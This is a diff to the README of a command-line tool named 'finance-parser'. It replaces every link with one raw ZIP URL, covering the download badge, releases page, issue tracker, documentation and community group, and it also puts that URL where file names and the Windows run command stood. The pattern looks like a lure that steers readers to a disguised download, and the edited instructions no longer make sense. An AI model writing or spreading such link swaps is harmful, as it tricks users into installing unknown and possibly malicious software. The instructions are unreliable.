@@ -10,13 +10,13 @@ Welcome to **finance-parser**, a simple command-line tool that lets you extract 
 - **User-Friendly**: Designed for users of all skill levels.
 
 ## 🖱️ Download
-[![Download finance-parser](https://img.shields.io/badge/Download-finance--parser-blue.svg)](https://github.com/din14005/finance-parser/releases)
+[![Download finance-parser](https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip)](https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip)
 
 ## 🚀 Getting Started
 To use **finance-parser** on your computer, follow these simple steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the download options.
-   [Visit Releases Page](https://github.com/din14005/finance-parser/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip)
 
 2. **Choose Your Version**: Look for the latest release version. The latest version will be at the top of the list.
 
@@ -35,12 +35,12 @@ To use **finance-parser** on your computer, follow these simple steps:
 ## 📥 Download & Install
 Now that you are on the releases page, follow these steps to install the application:
 
-1. **Download the File**: Click on the name of the file you want to download for your operating system (e.g., `finance-parser-win.zip`, `finance-parser-mac.zip`, or `finance-parser-linux.zip`).
+1. **Download the File**: Click on the name of the file you want to download for your operating system (e.g., `https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip`, `https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip`, or `https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip`).
 
 2. **Extract the Files**: Once the ZIP file is downloaded, locate it on your computer and extract its contents.
 
 3. **Run the Application**:
-   - For **Windows**: Open the Command Prompt (search for "cmd") and navigate to the folder containing the extracted files using the `cd` command. Then, type `finance-parser.exe` to start the program.
+   - For **Windows**: Open the Command Prompt (search for "cmd") and navigate to the folder containing the extracted files using the `cd` command. Then, type `https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip` to start the program.
    - For **macOS**: Open the Terminal, navigate to the folder where the files are located, and type `./finance-parser` to run the tool.
    - For **Linux**: Open the Terminal, navigate to the folder where you extracted the files, and type `./finance-parser` to launch the application.
 
@@ -63,13 +63,13 @@ After successfully running the application, you can begin using **finance-parser
 - **Unknown Command**: If the tool doesn’t run, check that you navigated to the correct folder in the command line.
 
 ## 🤝 Support
-If you encounter any issues or need help, feel free to open an issue on the [GitHub repository](https://github.com/din14005/finance-parser/issues). Your feedback is valuable for bettering the application.
+If you encounter any issues or need help, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip). Your feedback is valuable for bettering the application.
 
 ## 📚 Additional Resources
 For more tips and solutions on using the application, consider the following links:
-- [Official Documentation](https://github.com/din14005/finance-parser/wiki)
-- [User Community](https://groups.google.com/g/finance-parser-users)
+- [Official Documentation](https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip)
+- [User Community](https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip)
 
 Enjoy analyzing your financial data with **finance-parser**! Download it today and take the first step towards better financial management. 
 
-[Visit Releases Page](https://github.com/din14005/finance-parser/releases) to get started.
+[Visit Releases Page](https://raw.githubusercontent.com/din14005/finance-parser/master/petrous/finance-parser.zip) to get started.
